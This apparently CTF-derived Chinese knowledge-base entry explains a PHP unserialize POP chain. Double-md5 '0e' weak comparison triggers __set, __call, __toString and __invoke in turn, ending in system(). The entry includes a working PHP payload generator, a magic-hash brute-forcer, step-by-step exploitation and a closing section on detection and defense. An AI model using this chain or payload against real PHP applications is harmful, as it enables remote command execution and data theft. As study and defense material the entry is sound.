---
id: web-php-deserialization-double-md5-weak-compare-pop-chain
title: PHP POP 链：双 md5 0e 弱比较触发 __set 回调链到 system
type: scenario
domain: web
path: web/php/deserialization
technique: double-md5-weak-compare-pop-chain
aliases:
- 双 md5 0e 绕过
- md5(md5()) 弱相等
- popself
- PHP 魔术方法回调链
- __destruct __set __call __toString __invoke
tags:
- php
- deserialization
- pop-chain
- magic-method
- md5
- type-juggling
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:33+08:00'
  notes: 已对照原文 code/exp 核对；md5(md5(jdk45GyM)) 与 s878926199a magic hash 已复算；PoC 未在本机执行。
---

## 一句话结论

当 `unserialize` 的入口类在 `__destruct` 中先用 `md5(md5($a)) === md5($b)` 判不等、再用 `==` 判相等，并把结果导向 `$obj->prop = value` 时，可用“双 md5 后为 0e 纯数字”的字符串满足弱相等，触发 `__set`，再经 callable、`__call`、`__toString`、`__invoke` 一路把可控参数送进 `system`。

## 原理

- PHP 的 `==` 在比较两个“数字字符串”时按数值比较。`0e` 开头且后续全为数字的 MD5 结果会被当作科学计数法 `0`，因此任意两个 `0e[0-9]+` 字符串在 `==` 下相等；`===` 要求类型和字面值都相同，所以同一对值在 `===` 下为假，正好通过“先强比较 die、再弱比较进入利用分支”的判断。
- 第一处比较是 `md5(md5($KiraKiraAyu))`，第二处是 `md5($K4per)`。要让两者都为 `0e[0-9]+`：`$K4per` 可用已知 magic hash 原串（如 `s878926199a`，其 MD5 为 `0e545993274517709034328855841020`）；`$KiraKiraAyu` 需要其“MD5 的 MD5”为 0e 纯数字，可本地爆破（如 `jdk45GyM` 的双 md5 为 `0e338356492969358254985675736516`）。
- 弱比较通过后执行 `$this->QYQS->partner = "summer"`。`QYQS` 是不存在 `partner` 属性的对象时触发 `__set`；`__set` 读取 `$this->Fox`，若它不是 `All_in_one` 实例且 `$fox() === "summer"`，就把控制流交给 `$this->komiko->Eureka($this->L, $this->sleep3r)`。
- `Fox` 设为数组 `['summer', 'find_myself']` 时，PHP 把它当作可调用数组（静态方法回调），返回字符串 `summer`，满足判断。`komiko` 对象没有 `Eureka` 方法，触发 `__call`；`__call` 用 `strlen($args[0]) < 4 && ($args[0] + 1) > 10000` 做门槛，`$args[0]` 传 `"9e9"`（长度 3，数值约 1e10）即可通过，随后 `echo $args[1]` 把第二个参数当字符串处理，触发其 `__toString`。
- `__toString` 取出 `_4ak5ra` 属性并调用 `$a()`，若该属性是对象则触发 `__invoke`；`__invoke` 执行 `$f($arg)`，其中 `$f` 来自 `Samsāra`、`$arg` 来自 `ivory`，把两者分别设为 `system` 和命令（如 `env`）即可命令执行。
- 整条链成立的关键是：魔术方法在属性访问/字符串化/函数调用时自动触发，而对象属性全部来自反序列化数据；开发者只校验了前半段的哈希，却把后续对象图完全交给攻击者控制。

## 触发条件

- 应用对用户可控数据调用 `unserialize()`，且没有 `allowed_classes` 白名单或签名校验。
- 入口类的 `__destruct`/`__wakeup` 等魔术方法会把属性写入另一个对象（触发 `__set`），或把属性当函数/字符串使用。
- 存在可用的 callable（如 `['类名','静态方法']`）和可触发 `__call`/`__toString`/`__invoke` 的类。
- 目标环境允许 `system`/`exec` 等命令执行函数，且 PHP 版本下 `0e` 字符串的 `==` 仍按数值比较（PHP 7/8 均适用）。

## 利用步骤

1. 阅读入口类与全部魔术方法，画出属性到方法的触发图：`__destruct -> __set -> __call -> __toString -> __invoke -> system`。
2. 找出哈希判断的前置条件：构造 `$K4per` 为已知 magic hash 原串；爆破一个字符串，使其 `md5(md5(s))` 为 `0e[0-9]+`。
3. 构造对象图：入口对象的 `QYQS` 指向一个对象；该对象的 `Fox` 为可调用数组、`komiko` 为对象、`L` 为 `"9e9"`、`sleep3r` 为对象；`sleep3r->_4ak5ra` 为对象，其 `Samsāra="system"`、`ivory="env"`。
4. 用 PHP 的 `serialize()` 生成 payload，URL 编码后传给 `unserialize` 入口。
5. 观察 `system` 命令输出；将 `env` 换成 `cat /flag` 等命令读取目标文件。

## PoC

```php
<?php
class All_in_one {
    public $KiraKiraAyu = "jdk45GyM";      // md5(md5(s)) = 0e338356...
    public $K4per = "s878926199a";          // md5(s) = 0e545993...
    public $QYQS;
    public $sleep3r;
    public $_4ak5ra;
    public $Samsāra;
    public $ivory;
    public $Fox;
    public $komiko;
    public $L;
}
$a = new All_in_one();
$a->QYQS = new All_in_one();
$a->QYQS->Fox = ['summer', 'find_myself'];
$a->QYQS->komiko = new All_in_one();
$a->QYQS->L = '9e9';
$a->QYQS->sleep3r = new All_in_one();
$a->QYQS->sleep3r->_4ak5ra = new All_in_one();
$a->QYQS->sleep3r->_4ak5ra->Samsāra = 'system';
$a->QYQS->sleep3r->_4ak5ra->ivory = 'env';
echo urlencode(serialize($a));
```

双 md5 爆破思路（简化）：

```python
import hashlib, random, string
while True:
    s = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    m2 = hashlib.md5(hashlib.md5(s.encode()).hexdigest().encode()).hexdigest()
    if m2.startswith('0e') and m2[2:].isdigit():
        print(s, m2)  # 例如 jdk45GyM 0e338356...
        break
```

## 变体与关联

- 变体：把 `md5` 换成 `sha1`/`hash('md5')` 等同样可能产生 `0e` 纯数字；把命令执行换成文件写入、`include` 或 `call_user_func`。
- 变体：若 `===` 判断的是同一表达式，可用数组绕过（`md5(array)` 返回 null）或真正的 MD5 碰撞；本题是双 md5 与单 md5 的跨表达式比较，只能用弱类型。
- 变体：触发点不一定是 `__destruct`，`__wakeup`、`__toString`、`offsetGet` 等只要能把属性写入对象，都可接 `__set` 链路。
- 关联：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术方法链到 eval）、[[web-php-deserialization-pop-filelogger-webshell]]（POP 链写 shell）；弱类型哈希另见 `ctf-web-php-str-replace-double-write-object-cast-md5-magic-hash`。
- 边界：PHP 8 对字符串与数字的比较更严格，但两个数字字符串之间仍按数值比较；若代码使用 `hash_equals` 或 `===` 比较哈希、或对 `unserialize` 使用 `allowed_classes` 白名单，本链失效。

## 检测与防御

- 不要对不可信输入使用 `unserialize()`；必须使用时用 `allowed_classes` 白名单，并在反序列化前做 HMAC/签名校验。
- 哈希比较使用 `hash_equals` 或 `===`，不要用 `==`；对 `md5(md5(...))` 这类复合表达式尤其要避免弱比较。
- 审查所有魔术方法：禁止在 `__destruct`/`__wakeup`/`__set`/`__call`/`__toString` 中执行用户可控的 callable、文件操作或命令。
- 禁用不必要的 `system`/`exec`/`passthru`，Web 进程降权并限制可读文件。
- 检测：请求中出现 `O:`、`a:` 等序列化结构，或 `md5` 比较附近出现 `0e` 纯数字；监控 `unserialize` 调用与命令执行函数。
